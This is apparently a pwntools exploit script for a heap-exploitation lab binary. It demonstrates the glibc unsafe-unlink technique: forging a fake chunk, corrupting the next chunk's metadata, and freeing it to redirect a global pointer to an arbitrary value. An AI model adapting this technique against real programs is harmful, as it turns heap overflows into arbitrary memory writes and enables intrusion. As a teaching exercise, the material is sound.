#!/usr/bin/env python3

import pwn
import sys

BIN_FILENAME = "/lab/bin/playground"

gdbscript = """
    set resolve-heap-via-heuristic force
    continue
"""


def exploit(p):
    # get leaks
    p.recvuntil(b"[*] stack ")
    stack_ptr = int(p.recvline()[:-1], 16)
    print(f"stack_ptr: {stack_ptr:#x}")
    p.recvuntil(b"[*] global ")
    data_ptr = int(p.recvline()[:-1], 16)
    print(f"data_ptr: {data_ptr:#x}")

    global_var = data_ptr

    # first allocation, 0x430 chunk
    # assuming an overflow from this chunk to the next one.
    p.clean()
    p.sendline(b"malloc 0x420")
    p.recvuntil(b"[*]")
    ptr1 = int(p.recvline()[:-1], 16)
    print(f"ptr1: {ptr1:#x}")

    # second 0x430 chunk
    # this will be the chunk that we're going to corrupt
    p.clean()
    p.sendline(b"malloc 0x420")
    p.recvuntil(b"[*]")
    ptr2 = int(p.recvline()[:-1], 16)
    print(f"ptr2: {ptr2:#x}")

    # simulate a global variable pointing to the chunk
    p.sendline(f"write {global_var:#x} 0x8".encode())
    p.sendline(pwn.p64(ptr1))
    print(f"global_var @ {global_var:#x} = {ptr1:#x}")

    # create a fake 0x420 chunk
    fake_chunk = (
        pwn.p64(0x0) +                  # prev size
        pwn.p64(0x421) +                # current size 0x420 + P flag. real size is 0x430, -0x10 header = 0x420
        pwn.p64(global_var - 0x8*3) +   # fake fd
        pwn.p64(global_var - 0x8*2)     # fake bk
    )

    size = 0x420 + 8 + 8

    # forge fake chunk and overwrite next chunk metadata
    p.sendline(f"write {ptr1:#x} {size:#x}".encode())
    p.sendline(
        fake_chunk +
        (b"\x00" * (0x420-len(fake_chunk))) +       # padding
        pwn.p64(0x420) +                            # prev size
        pwn.p64(0x430)                              # curr size with P flag 0 to trigger backward consolidation
    )

    # free the corrupted chunk. this will cause backward consolidation
    # and unlink_chunk to be called with fake chunk. The result is a 
    # corruption of the global variable, pointing 4 qwords before itself.
    p.sendline(f"free {ptr2:#x}".encode())

    # global_var is pointing 4 qwords before itself, by writing to this var
    # it is possible to overwrite it with an arbitrary pointer
    dereferenced = global_var - 8*3
    print(f"global_var is now pointing 3 qwords before itself.")
    print(f"global_var @ {global_var:#x} = {dereferenced:#x}.")
    print(f"writing to global_var[3] makes it overwrite itself with an arbitrary pointer")
    input("press any key to continue")

    p.sendline(f"write {global_var:#x} 0x8".encode())
    p.sendline(pwn.p64(0xdeadbeef))
    input("done. global_var corrupted to an arbitrary pointer")

def main():
    if "--gdb" in sys.argv:
        p = pwn.gdb.debug(
            BIN_FILENAME,
            env={},
            gdbscript=gdbscript
        )
    else:
        p = pwn.process(BIN_FILENAME, env={})

    exploit(p)


if __name__ == "__main__":
    main()
